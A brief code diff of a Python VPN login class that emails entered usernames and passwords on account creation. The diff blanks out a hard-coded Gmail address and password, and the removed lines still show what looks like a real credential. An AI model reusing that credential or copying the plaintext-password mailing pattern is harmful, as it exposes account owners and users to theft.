@@ -52,9 +52,9 @@ class Login:
     def sending_email(self):
         subject = "Someone is attempting to create a new VPN account. "
         mail_content = f"Username: {str(self.username)} \nPassword: {str(self.password)}" 
-        sender_email = "MMillwardPython@gmail.com"
-        sender_password = "Ma77hewM!"
-        receiver_email = "MMillwardPython@gmail.com"        
+        sender_email = ""
+        sender_password = ""
+        receiver_email = ""        
         message = MIMEMultipart()
         message['From'] = sender_email
         message['To'] = receiver_email
